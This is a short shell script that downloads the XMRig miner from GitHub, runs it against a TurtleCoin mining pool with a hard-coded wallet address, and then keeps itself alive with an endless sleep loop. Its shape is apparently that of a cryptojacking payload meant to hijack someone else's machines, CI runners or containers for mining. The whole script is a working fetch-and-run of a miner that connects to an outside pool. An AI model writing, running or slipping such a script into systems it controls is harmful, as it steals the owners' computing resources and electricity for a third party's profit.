#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-static-x64.tar.gz
tar xf xmrig-6.16.1-linux-static-x64.tar.gz
cd xmrig-6.16.1
./xmrig -o de.turtlecoin.herominers.com:1160 -u TRTLv35E2HcD2X2TKdFkBp3YwkRpmsxZxMfqWSN1QyGmRCFUu6r8s4oa4sJC9hwwAegobWrT25S3yHtNu14bizZzWVTzJJsr5u1 -p ajul -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999
